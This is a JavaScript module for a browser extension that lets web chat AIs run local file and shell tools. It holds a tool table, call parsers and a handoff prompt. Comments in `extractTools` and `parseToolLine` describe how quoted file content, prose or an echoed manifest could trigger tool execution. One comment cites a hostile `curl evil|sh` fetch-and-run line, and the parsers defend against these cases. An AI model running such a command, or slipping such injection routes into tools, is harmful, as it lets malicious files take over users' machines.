// AI Continuity Bridge — the shared tool vocabulary.
//
// One table describing every tool the bridge can execute, plus the parsers
// and formatters derived from it. This mirrors `SPECS` in
// `src-tauri/src/bridge.rs`; the two must stay in step.
//
// Loaded first by both content scripts (`content.js` for chatgpt.com,
// `content-any.js` for claude.ai/gemini.google.com) and by the service
// worker via `importScripts`. Before this existed the two content scripts
// carried duplicate copies of every parser and drifted apart.
//
// Exposed as `globalThis.ACBToolSpec`.

(() => {
  "use strict";

  // ── The table ───────────────────────────────────────────────────
  //
  // name       canonical wire name
  // variant    legacy v1 serde variant (`{"ReadFile":{...}}`)
  // aliases    other names a web AI might emit; resolved for JSON calls
  // args       [{ name, hint?, required?, multiline?, type? }]
  //            type: "int" coerces with Number(); "bool" accepts true/false,
  //            "true"/"false", 1/0. Arrays pass through untouched (the core
  //            validates shape). Everything else must be a string.
  // approval   auto | sensitive-path | always | destructive
  // autoInsert read-only result → paste straight into the composer
  // timeoutMs  must match the Rust spec's timeout_ms
  // lineRe     one-line call syntax. Absent → JSON block only.
  // stage      live progress label: verb + (args[arg] || fallback), or noun
  //
  // Array order is `parseToolLine`'s match precedence, so it is kept as it
  // was when these regexes lived in `content.js`. `manifest()` sorts by
  // group instead, so display order is independent of this.
  const TOOLS = [
    {
      name: "read_file",
      variant: "ReadFile",
      aliases: ["read", "view_file", "cat", "open_file"],
      args: [
        { name: "path", required: true },
        { name: "offset", hint: "offset?", required: false, type: "int" },
      ],
      summary: "Read a file as numbered lines, in chunks for large files",
      group: "Reading",
      approval: "sensitive-path",
      autoInsert: true,
      timeoutMs: 10000,
      // The closing quote stays optional (models truncate it); the trailing
      // `, 401` is the chunk offset the core's footer tells them to send back.
      lineRe: /read_file\s*[(:]\s*["']([^"'\s)]+)["']?\s*(?:,\s*(\d+))?/i,
      lineArgs: ["path", "offset"],
      stage: { verb: "Reading", arg: "path", fallback: "file" },
    },
    {
      name: "write_file",
      variant: "WriteFile",
      aliases: ["write", "create_file", "put_file"],
      args: [
        { name: "path", required: true },
        { name: "content", required: true, multiline: true },
      ],
      summary: "Overwrite a file with new content",
      group: "Editing",
      approval: "always",
      autoInsert: false,
      timeoutMs: 15000,
      lineRe: /write_file\s*[(:]\s*["']([^"']+)["']\s*[,)\s]\s*["']([\s\S]*?)["']\s*\)?/i,
      lineArgs: ["path", "content"],
      stage: { verb: "Writing", arg: "path", fallback: "file" },
    },
    {
      name: "edit_file",
      variant: "EditFile",
      aliases: ["edit", "str_replace", "replace", "apply_edit"],
      args: [
        { name: "path", required: true },
        { name: "old_string", required: true, multiline: true },
        { name: "new_string", required: true, multiline: true },
        { name: "replace_all", hint: "replace_all?", required: false, type: "bool" },
      ],
      summary: "Replace one exact string in a file",
      group: "Editing",
      approval: "sensitive-path",
      autoInsert: false,
      timeoutMs: 15000,
      // No lineRe: old/new strings are routinely multiline, so this is
      // taught as an acb JSON block (like write_file).
      stage: { verb: "Editing", arg: "path", fallback: "file" },
    },
    {
      name: "multi_edit",
      variant: "MultiEdit",
      aliases: ["multi_edit_file", "batch_edit", "edit_many"],
      args: [
        { name: "path", required: true },
        { name: "edits", hint: "edits[]", required: true, multiline: true },
      ],
      summary: "Apply several exact-string edits to one file, atomically",
      group: "Editing",
      approval: "sensitive-path",
      autoInsert: false,
      timeoutMs: 20000,
      stage: { verb: "Editing", arg: "path", fallback: "file" },
    },
    {
      name: "apply_patch",
      variant: "ApplyPatch",
      aliases: ["patch", "unified_diff"],
      args: [
        { name: "path", required: true },
        { name: "patch", required: true, multiline: true },
      ],
      summary: "Apply a single-file unified diff",
      group: "Editing",
      approval: "always",
      autoInsert: false,
      timeoutMs: 20000,
      stage: { verb: "Patching", arg: "path", fallback: "file" },
    },
    {
      name: "delete_file",
      variant: "DeleteFile",
      aliases: ["remove_file", "rm_file", "remove"],
      args: [{ name: "path", required: true }],
      summary: "Delete a file (not directories)",
      group: "Editing",
      approval: "destructive",
      autoInsert: false,
      timeoutMs: 10000,
      lineRe: /delete_file\s*[(:]\s*["']([^"'\s)]+)["']?\s*\)?/i,
      lineArgs: ["path"],
      stage: { verb: "Deleting", arg: "path", fallback: "file" },
    },
    {
      name: "move_file",
      variant: "MoveFile",
      aliases: ["rename_file", "rename", "mv"],
      args: [
        { name: "from", required: true },
        { name: "to", required: true },
      ],
      summary: "Move or rename a file, overwriting the target",
      group: "Editing",
      approval: "destructive",
      autoInsert: false,
      timeoutMs: 10000,
      lineRe: /move_file\s*[(:]\s*["']([^"']+)["']\s*,\s*["']([^"']+)["']\s*\)?/i,
      lineArgs: ["from", "to"],
      stage: { verb: "Moving", arg: "from", fallback: "file" },
    },
    {
      name: "copy_file",
      variant: "CopyFile",
      aliases: ["cp_file", "duplicate_file", "cp"],
      args: [
        { name: "from", required: true },
        { name: "to", required: true },
      ],
      summary: "Copy a file, overwriting the target",
      group: "Editing",
      approval: "always",
      autoInsert: false,
      timeoutMs: 10000,
      lineRe: /copy_file\s*[(:]\s*["']([^"']+)["']\s*,\s*["']([^"']+)["']\s*\)?/i,
      lineArgs: ["from", "to"],
      stage: { verb: "Copying", arg: "from", fallback: "file" },
    },
    {
      name: "create_directory",
      variant: "CreateDirectory",
      aliases: ["mkdir", "create_dir", "make_directory"],
      args: [{ name: "path", required: true }],
      summary: "Create a directory and its parents",
      group: "Editing",
      approval: "auto",
      autoInsert: false,
      timeoutMs: 10000,
      lineRe: /create_directory\s*[(:]\s*["']([^"'\s)]+)["']?\s*\)?/i,
      lineArgs: ["path"],
      stage: { verb: "Creating", arg: "path", fallback: "directory" },
    },
    {
      name: "read_many_files",
      variant: "ReadManyFiles",
      aliases: ["read_files", "read_many"],
      args: [{ name: "paths", hint: "paths[]", required: true, multiline: true }],
      summary: "Read several files in one call, first chunk of each",
      group: "Reading",
      approval: "auto",
      autoInsert: true,
      timeoutMs: 15000,
      // No lineRe: an argument list is awkward in line syntax; acb JSON
      // block only.
      stage: { verb: "Reading", noun: "the files" },
    },
    {
      name: "run_command",
      variant: "RunCommand",
      aliases: ["bash", "shell", "execute", "terminal", "sh"],
      args: [{ name: "command", hint: "shell command", required: true }],
      summary: "Run a shell command in the project root",
      group: "Commands",
      approval: "always",
      autoInsert: false,
      timeoutMs: 120000,
      // The quote is optional on purpose — models very often write the bare
      // `run_command: npm test`. That leniency is only safe because
      // `parseToolLine` anchors to the start of the line and `manifest()` is
      // not rendered in call syntax; without both, prose mentioning the tool
      // would execute. Do not loosen either without revisiting this.
      lineRe: /run_command\s*[(:]\s*["']?([^"'\n]+)["']?\s*\)?/i,
      lineArgs: ["command"],
      stage: { verb: "Running", arg: "command", fallback: "command" },
    },
    {
      name: "list_directory",
      variant: "ListDirectory",
      aliases: ["ls", "list_dir", "list", "dir"],
      args: [{ name: "path", required: true }],
      summary: "List the entries of a directory",
      group: "Reading",
      approval: "auto",
      autoInsert: true,
      timeoutMs: 10000,
      lineRe: /list_directory\s*[(:]\s*["']([^"']+)["']/i,
      lineArgs: ["path"],
      stage: { verb: "Listing", arg: "path", fallback: "directory" },
    },
    {
      name: "git_status",
      variant: "GitStatus",
      aliases: ["status", "git_st"],
      args: [],
      summary: "Show changed files in the git working tree",
      group: "Git",
      approval: "auto",
      autoInsert: true,
      timeoutMs: 10000,
      // Parens are required: the bare name appears in the manifest, in the
      // README's tool list and in ordinary prose, so matching the bare word
      // let any AI that echoed one of those silently run it.
      lineRe: /git_status\s*\(\s*\)/i,
      lineArgs: [],
      stage: { verb: "Fetching", noun: "git status" },
    },
    {
      name: "describe_tool",
      variant: "DescribeTool",
      aliases: ["tool_help", "help", "tool_info"],
      args: [{ name: "name", required: true }],
      summary: "Show the full argument schema for one tool",
      group: "Meta",
      approval: "auto",
      autoInsert: true,
      timeoutMs: 5000,
      lineRe: /describe_tool\s*[(:]\s*["']([^"']+)["']/i,
      lineArgs: ["name"],
      stage: { verb: "Fetching", arg: "name", fallback: "tool info" },
    },
    {
      name: "list_tools",
      variant: "ListTools",
      aliases: ["tools", "available_tools"],
      args: [],
      summary: "List every available tool, grouped",
      group: "Meta",
      approval: "auto",
      autoInsert: true,
      timeoutMs: 5000,
      // Parens are required: a bare `list_tools` appears inside the
      // manifest itself, so matching the bare word would let an AI that
      // echoes the manifest re-trigger it in a loop.
      lineRe: /list_tools\s*\(\s*\)/i,
      lineArgs: [],
      stage: { verb: "Fetching", noun: "the tool list" },
    },
  ];

  const GROUPS = ["Reading", "Editing", "Commands", "Search", "Git", "Planning", "Meta"];

  // ── Indexes ─────────────────────────────────────────────────────
  const BY_NAME = new Map();
  const BY_VARIANT = new Map();
  for (const spec of TOOLS) {
    BY_NAME.set(spec.name, spec);
    for (const alias of spec.aliases) BY_NAME.set(alias, spec);
    BY_VARIANT.set(spec.variant, spec);
  }

  /** Lowercase, `-`/space → `_`, and drop any `default_api.` style prefix. */
  function normalizeName(raw) {
    return String(raw ?? "")
      .split(".")
      .pop()
      .trim()
      .toLowerCase()
      .replace(/[\s-]/g, "_");
  }

  /** Resolve a canonical name or alias to its spec. */
  function specByName(raw) {
    return BY_NAME.get(normalizeName(raw)) || null;
  }

  /**
   * Normalize any of the three tool-object shapes in circulation into
   * `{ name, args, spec }`:
   *   - a parsed v2 call:  { name: "read_file", arguments: { path } }
   *   - a v2 result's meta: { tool: "read_file", path }
   *   - a legacy v1 enum:  { ReadFile: { path } }
   * Serde writes a v1 *unit* variant as the bare string "GitStatus", so a
   * plain string is accepted too.
   */
  function normalizeTool(tool) {
    if (typeof tool === "string") {
      const spec = BY_VARIANT.get(tool.trim()) || specByName(tool);
      return spec ? { name: spec.name, args: {}, spec } : null;
    }
    if (!tool || typeof tool !== "object") return null;

    for (const [variant, spec] of BY_VARIANT) {
      if (tool[variant] != null) {
        return { name: spec.name, args: tool[variant] || {}, spec };
      }
    }

    const spec = specByName(tool.name ?? tool.tool);
    if (!spec) {
      const name = normalizeName(tool.name ?? tool.tool);
      return name ? { name, args: tool.arguments || tool, spec: null } : null;
    }
    // A meta object carries its args inline rather than under `arguments`.
    return { name: spec.name, args: tool.arguments || tool, spec };
  }

  // ── Capture patterns ────────────────────────────────────────────
  // Priority 1: <acb_tool>…</acb_tool> tags (most reliable)
  const ACB_TAG_RE = /<acb_tool>([\s\S]*?)<\/acb_tool>/gi;
  // Priority 2: fenced JSON blocks (```acb or ```json) — the taught form
  const FENCED_RE = /```(?:acb|json)\s*\n([\s\S]*?)```/gi;
  // Any other fenced block is quoted content, never a directive — see
  // extractTools. `[^\n]*` swallows the info string (```bash, ```sh …).
  const PLAIN_FENCE_RE = /```[^\n]*[\s\S]*?```/g;
  // A fence never closed: everything from it on is quoted (streaming).
  const OPEN_FENCE_RE = /```[^\n]*[\s\S]*$/;
  // Priority 3: bare inline JSON (fallback)
  const TOOL_KEY_RE = /["'](?:tool|name)["']\s*:/gi;

  /** The `{…}` starting at `start`, respecting strings and escapes. */
  function balancedObjectAt(text, start) {
    let depth = 0;
    let inStr = false;
    let esc = false;
    for (let i = start; i < text.length; i++) {
      const c = text[i];
      if (inStr) {
        if (esc) esc = false;
        else if (c === "\\") esc = true;
        else if (c === '"') inStr = false;
        continue;
      }
      if (c === '"') inStr = true;
      else if (c === "{") depth++;
      else if (c === "}") {
        depth--;
        if (depth === 0) return text.slice(start, i + 1);
      }
    }
    return null;
  }

  /**
   * Coerce one captured argument to the type its spec declares. Returns
   * `undefined` when the value is unusable, so the required check can reject.
   *
   * `int` is coerced with Number() (a chunk offset arrives as a JSON number
   * from a model writing raw JSON and as a digit string from
   * `parseToolLine`). `bool` accepts true/false, "true"/"false" and 1/0 —
   * models quote booleans exactly like they quote offsets. Arrays pass
   * through untouched (`edits`, `paths`): the core validates their shape,
   * and duplicating that validation here would drift.
   */
  function coerceArg(arg, raw) {
    if (raw == null) return undefined;
    if (arg && arg.type === "int") {
      const n = Number(raw);
      return Number.isFinite(n) ? Math.trunc(n) : undefined;
    }
    if (arg && arg.type === "bool") {
      if (typeof raw === "boolean") return raw;
      if (typeof raw === "number") return raw === 1 ? true : raw === 0 ? false : undefined;
      if (typeof raw === "string") {
        const s = raw.trim().toLowerCase();
        if (s === "true" || s === "1" || s === "yes") return true;
        if (s === "false" || s === "0" || s === "no") return false;
      }
      return undefined;
    }
    if (Array.isArray(raw)) return raw;
    return typeof raw === "string" ? raw : undefined;
  }

  /**
   * Parse one JSON tool object. Arguments are accepted either nested under
   * `arguments` or flat on the object, since models emit both.
   */
  function parseJsonBlock(body) {
    let obj;
    try {
      obj = JSON.parse(String(body).trim());
    } catch {
      return null;
    }
    const spec = specByName(obj.tool ?? obj.name);
    if (!spec) return null;

    const src = obj.arguments && typeof obj.arguments === "object" ? obj.arguments : {};
    const args = {};
    for (const arg of spec.args) {
      const value = coerceArg(arg, src[arg.name] ?? obj[arg.name]);
      if (value === undefined) {
        if (arg.required) return null;
        continue;
      }
      args[arg.name] = value;
    }
    return { name: spec.name, arguments: args };
  }

  /**
   * Leading noise a model puts in front of a call: list markers, backticks,
   * `1.` ordinals. A blockquote arrow is deliberately NOT stripped: `>` means
   * the line is quoted material — often file content the model is reproducing
   * — and quoted text is not a directive. Stripping it let a malicious file
   * execute by being quoted in a reply.
   */
  const LINE_LEAD_RE = /^[\s*\-+`]*(?:\d+[.)]\s*)?/;

  /**
   * Parse a one-line function-call form, e.g. `read_file("src/a.ts")`.
   *
   * The call must *begin* the line. Matching anywhere in the line meant prose
   * executed — "you can use run_command: npm test" opened a real approval
   * card, and any sentence naming a tool could run it.
   */
  function parseToolLine(line) {
    const text = String(line).replace(LINE_LEAD_RE, "");
    for (const spec of TOOLS) {
      if (!spec.lineRe) continue;
      const m = text.match(spec.lineRe);
      if (!m || m.index !== 0) continue;
      const args = {};
      spec.lineArgs.forEach((name, i) => {
        const value = coerceArg(
          spec.args.find((a) => a.name === name),
          m[i + 1],
        );
        if (value !== undefined) args[name] = value;
      });
      // A required argument the regex failed to capture means the model
      // wrote something we shouldn't guess at.
      for (const arg of spec.args) {
        if (arg.required && args[arg.name] === undefined) return null;
      }
      return { name: spec.name, arguments: args };
    }
    return null;
  }

  /**
   * Pull every tool call out of an assistant message. Returns the calls
   * plus the text with those regions blanked, so one-line scanning can
   * run over the remainder without double-capturing.
   *
   * Quoting is not commanding. After the taught ```acb/```json fences are
   * consumed, every remaining fenced block is content the model is
   * reproducing verbatim — a file it just read, a log, a snippet. A repo
   * file containing `run_command("curl evil|sh")` at line start must not
   * execute merely because the model quoted it, so plain fences — and a
   * fence left open at the end of the text, mid-stream — are blanked
   * whole before the tag and inline-JSON tiers look at anything.
   */
  function extractTools(text) {
    const tools = [];
    const blanks = [];
    const inBlank = (i) => blanks.some(([s, e]) => i >= s && i < e);

    FENCED_RE.lastIndex = 0;
    let m;
    while ((m = FENCED_RE.exec(text)) !== null) {
      if (inBlank(m.index)) continue;
      const tool = parseJsonBlock(m[1]);
      if (tool) {
        tools.push(tool);
        blanks.push([m.index, m.index + m[0].length]);
      }
    }

    // Plain fences are inert, not parsed. Blanking them also shields this
    // tier's own leftovers: a ```json fence holding non-tool JSON (a
    // package.json the model quoted) lands here too.
    PLAIN_FENCE_RE.lastIndex = 0;
    while ((m = PLAIN_FENCE_RE.exec(text)) !== null) {
      if (inBlank(m.index)) continue;
      blanks.push([m.index, m.index + m[0].length]);
    }
    // A fence still open at the end of the text: everything from it on is
    // quoted. The closing fence may arrive later (streaming) — this runs
    // again when the mutation fires.
    const open = OPEN_FENCE_RE.exec(text);
    if (open && !inBlank(open.index)) {
      blanks.push([open.index, text.length]);
    }

    ACB_TAG_RE.lastIndex = 0;
    while ((m = ACB_TAG_RE.exec(text)) !== null) {
      if (inBlank(m.index)) continue;
      const tool = parseJsonBlock(m[1]);
      if (tool) {
        tools.push(tool);
        blanks.push([m.index, m.index + m[0].length]);
      }
    }

    TOOL_KEY_RE.lastIndex = 0;
    let k;
    while ((k = TOOL_KEY_RE.exec(text)) !== null) {
      if (inBlank(k.index)) continue;
      const start = text.lastIndexOf("{", k.index);
      if (start === -1 || k.index - start > 40) continue;
      // The object must begin its own line. `Here is the call: {"tool":…}`
      // inside a sentence is the model *discussing* the protocol, not
      // calling; a raw-JSON call is emitted as a standalone object.
      if (text.slice(text.lastIndexOf("\n", start) + 1, start).trim() !== "") continue;
      const objText = balancedObjectAt(text, start);
      if (!objText) continue;
      const tool = parseJsonBlock(objText);
      if (tool) {
        tools.push(tool);
        blanks.push([start, start + objText.length]);
        TOOL_KEY_RE.lastIndex = start + objText.length;
      }
    }

    // One sorted pass, not a splice per region: rebuilding the whole string
    // for every blank was O(n²) on long streaming messages with many fences,
    // and this runs on every scan. Sorting is safe here because the three
    // passes above never produce overlapping regions (fenced/tagged blocks
    // are consumed whole, and inline JSON objects are blanked before a
    // later pass can see them).
    const sorted = [...blanks].sort((a, b) => a[0] - b[0]);
    let rest = "";
    let at = 0;
    for (const [s, e] of sorted) {
      rest += text.slice(at, s) + " ".repeat(e - s);
      at = e;
    }
    rest += text.slice(at);
    return { tools, rest };
  }

  // ── Formatting ──────────────────────────────────────────────────

  /** Live progress label, e.g. `Reading src/a.ts`. */
  function stageLabel(tool) {
    const t = normalizeTool(tool);
    if (!t) return "Working…";
    const stage = t.spec && t.spec.stage;
    if (!stage) return `Fetching ${t.name}`;
    const subject = stage.arg ? t.args[stage.arg] || stage.fallback : stage.noun;
    return `${stage.verb} ${subject}`;
  }

  /** The call form, for docs. NOT for anything the AI might echo back. */
  function callSyntax(spec) {
    if (spec.args.length === 0) return spec.lineRe ? `${spec.name}()` : spec.name;
    const args = spec.args
      .map((a) => (a.type === "int" ? a.hint || a.name : `"${a.hint || a.name}"`))
      .join(", ");
    return `${spec.name}(${args})`;
  }

  /**
   * Grouped one-line-per-tool manifest. Kept terse on purpose.
   *
   * Deliberately rendered as an aligned table, NOT in call syntax. This text
   * is pasted into the chat, so the AI reliably echoes it back — and when it
   * did, `parseToolLine` matched every row and executed the entire tool
   * surface at once, approval cards and all. Nine of the eleven line regexes
   * require a quote after `(` or `:` (`run_command` is deliberately lenient,
   * and the two paren-only tools require `()`), so omitting parens and
   * quotes here is what makes the manifest inert. Never format these rows
   * as calls.
   */
  function manifest() {
    const lines = [];
    for (const group of GROUPS) {
      const rows = TOOLS.filter((t) => t.group === group);
      if (rows.length === 0) continue;
      lines.push(group);
      for (const s of rows) {
        const args = s.args.length ? s.args.map((a) => a.hint || a.name).join(", ") : "—";
        lines.push(`  ${s.name.padEnd(16)} ${args.padEnd(17)} ${s.summary}`);
      }
    }
    return lines.join("\n");
  }

  /** The tool instructions embedded in the handoff prompt. */
  function promptToolSection() {
    const jsonOnly = TOOLS.filter((t) => t.args.some((a) => a.multiline));
    const gated = TOOLS.filter((t) => t.approval === "always" || t.approval === "destructive");
    const example = jsonOnly[0] || TOOLS[0];
    return [
      `You are now the coding agent for the local project on the paired machine.`,
      `These tools execute on the real filesystem — call them, never simulate a result:`,
      ``,
      manifest(),
      ``,
      // `tool_name` resolves to no spec, so these two lines teach the syntax
      // without themselves being runnable calls.
      `Call a tool by writing its name at the start of its own line, with each`,
      `argument quoted, in the order the table's argument column lists them:`,
      ``,
      `  tool_name("first argument", "second argument")`,
      `  tool_name()   ← for a tool whose argument column shows —`,
      ``,
      `For ${jsonOnly.map((t) => t.name).join(", ")} — and ANY argument that spans multiple lines — you MUST instead emit an acb block containing one JSON object:`,
      '```acb',
      `{"tool":"${example.name}","path":"path/to/file.ext","content":"<entire new file content>"}`,
      '```',
      ``,
      `${gated.map((t) => t.name).join(" and ")} pause for the user's approval (given in the desktop app) — wait for the result rather than assuming it succeeded.`,
      // The core numbers every read and pages large files; without this the AI
      // treats the first chunk as the whole file and invents the rest.
      `Reads come back as numbered lines ("   1| ..."). A large file arrives one`,
      `chunk at a time and the chunk's final line names the exact call that`,
      `returns the next one — repeat that call when you need more of the file,`,
      `and never guess at content you have not been shown. Strip the "N| "`,
      `prefixes before writing any of that content back to a file.`,
      `Each call is executed locally by the bridge and the real result is returned here. Never claim to have read, written, or run anything without the tool result.`,
    ].join("\n");
  }

  // ── Lookups used across the extension ───────────────────────────
  const AUTO_INSERT = new Set(TOOLS.filter((t) => t.autoInsert).map((t) => t.name));

  /** Read-only result the content script can paste into the composer. */
  function isAutoInsert(name) {
    const spec = specByName(name);
    return spec ? AUTO_INSERT.has(spec.name) : false;
  }

  /** Per-tool request timeout for the service worker. */
  const TIMEOUTS = Object.fromEntries(TOOLS.map((t) => [t.name, t.timeoutMs]));

  function timeoutFor(name) {
    const spec = specByName(name);
    return spec ? spec.timeoutMs : 15000;
  }

  // ChatGPT's composer is a ProseMirror contenteditable: an insert builds a
  // node tree for every line, inside React's input handling. Pushing a whole
  // large file in pegged the CPU and froze the page. `read_file` now chunks at
  // 16KB in the core, so this is the backstop for everything else —
  // `run_command` output (1MB cap) and big `list_directory` listings.
  const COMPOSER_CAP = 24 * 1024;

  /**
   * Trim a tool result to something a rich-text composer can absorb. The
   * marker names the real size so the AI knows it saw only a prefix.
   */
  function capForComposer(text) {
    const s = String(text ?? "");
    if (s.length <= COMPOSER_CAP) return s;
    return `${s.slice(0, COMPOSER_CAP)}\n\n[truncated at ${COMPOSER_CAP} of ${s.length} bytes]`;
  }

  globalThis.ACBToolSpec = {
    TOOLS,
    GROUPS,
    TIMEOUTS,
    AUTO_INSERT,
    COMPOSER_CAP,
    normalizeName,
    specByName,
    normalizeTool,
    parseJsonBlock,
    parseToolLine,
    extractTools,
    balancedObjectAt,
    stageLabel,
    callSyntax,
    manifest,
    promptToolSection,
    isAutoInsert,
    timeoutFor,
    capForComposer,
  };
})();
